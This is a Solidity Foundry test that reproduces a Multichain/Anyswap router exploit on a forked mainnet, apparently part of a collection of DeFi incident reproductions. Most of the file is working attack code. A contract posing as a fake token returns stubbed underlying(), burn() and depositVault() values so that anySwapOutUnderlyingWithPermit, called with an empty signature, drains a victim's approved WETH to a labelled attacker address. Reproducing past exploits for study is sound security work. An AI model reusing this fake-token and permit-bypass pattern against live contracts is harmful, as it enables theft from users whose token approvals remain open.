// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

interface AnyswapV4Router {
  function anySwapOutUnderlyingWithPermit(
    address from,
    address token,
    address to,
    uint256 amount,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s,
    uint256 toChainID
  ) external;
}

interface AnyswapV1ERC20 {
  function mint(address to, uint256 amount) external returns (bool);

  function burn(address from, uint256 amount) external returns (bool);

  function changeVault(address newVault) external returns (bool);

  function depositVault(uint256 amount, address to) external returns (uint256);

  function withdrawVault(
    address from,
    uint256 amount,
    address to
  ) external returns (uint256);

  function underlying() external view returns (address);
}

// forge test --match-contract Exploit_Multichain -vvv
contract Exploit_Multichain is TestHarness, TokenBalanceTracker{
    address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    AnyswapV4Router swapRouter  = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    AnyswapV1ERC20 swap20 =AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address constant internal ATTACKER = 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
    address constant internal VICTIM = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
    uint256 constant internal stole_WETH = 308636644758370382903;
    uint256 constant internal FUTURE_DEADLINE = 100000000000000000000;
    
    function setUp() external {
        cheat.createSelectFork("mainnet", 14037236); // We pin one block before the exploit happened.

        cheat.deal(address(this), 0);

        cheat.label(ATTACKER, "Attacker");
        cheat.label(VICTIM, "Victim");
        cheat.label(address(swapRouter), "AnyswapV4Router");
        cheat.label(address(swap20), "AnyswapV1ERC20");
        cheat.label(address(weth), "WETH");

        addTokenToTracker(address(weth));
        updateBalanceTracker(address(this));
        updateBalanceTracker(VICTIM);
        updateBalanceTracker(ATTACKER);
    }

    function test_attack() external {
        cheat.startPrank(ATTACKER);
        console.log("\nBefore Attack Balances");
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Attacker EOA', ATTACKER);
        logBalancesWithLabel('Victim', VICTIM);

        //swapRouter.anySwapOutUnderlyingWithPermit(from, token, to, amount, deadline, v, r, s, toChainID);
        swapRouter.anySwapOutUnderlyingWithPermit(VICTIM, address(this), ATTACKER, stole_WETH, FUTURE_DEADLINE, 0, bytes32(0), bytes32(0), 56); // To BSC.
        console.log("\nDuring Attack Balances");
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Attacker EOA', ATTACKER);
        logBalancesWithLabel('Victim', VICTIM);
        cheat.stopPrank();
        
        // Send WETH from this contract to the attacker.
        weth.transfer(ATTACKER, weth.balanceOf(address(this)));

        console.log("\nAfter Attack Balances");
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Attacker EOA', ATTACKER);
        logBalancesWithLabel('Victim', VICTIM);
    }

    // Used to get the underlying of the token
    function underlying() external view returns (address){
        return address(weth);
        
    }

    // For _anySwapOut() that uses AnyswapV1ERC20 to wrap the token to burn it. Just return true so that call passes.
    function burn(address, uint256) external returns(bool){
        return true;
    }
    
    //The AnyswapV1ERC20() wraps the token and calls, this function.
    function depositVault(uint256 , address ) external returns (uint256){
        return 1;
    }

}
